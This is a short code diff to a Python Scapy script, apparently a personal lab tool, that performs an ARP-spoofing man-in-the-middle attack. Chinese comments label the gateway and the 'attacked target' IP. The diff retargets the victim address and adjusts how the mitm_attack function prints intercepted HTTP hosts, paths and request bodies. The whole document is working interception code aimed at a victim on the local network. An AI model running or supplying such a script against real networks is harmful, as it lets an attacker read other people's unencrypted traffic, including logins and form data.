@@ -8,7 +8,7 @@ from scapy.sendrecv import sniff, sendp
 mac_local = l2.Ether().src
 ip_gateway = "172.20.10.1"  # 网关IP
 mac_gateway = l2.getmacbyip(ip_gateway)
-ip_victim = "172.20.10.2"  # 被攻击对象 IP
+ip_victim = "172.20.10.8"  # 被攻击对象 IP
 mac_victim = l2.getmacbyip(ip_victim)
 
 p1_ether = l2.Ether(dst=mac_victim)
@@ -37,7 +37,7 @@ def mitm_attack(p: Packet):
     # if p.haslayer(inet.IP):
     #    print("src: %s, dst: %s" % (p[inet.IP].src, p[inet.IP].dst))
     if p.haslayer(http.HTTPRequest):
-        print(p[http.HTTPRequest].fields['Host'], p[http.HTTPRequest].fields['Path'])
+        print(p[http.HTTPRequest].fields['Host'] + p[http.HTTPRequest].fields['Path'])
         data = p[http.HTTPRequest].payload
         if len(data):
             print(data)
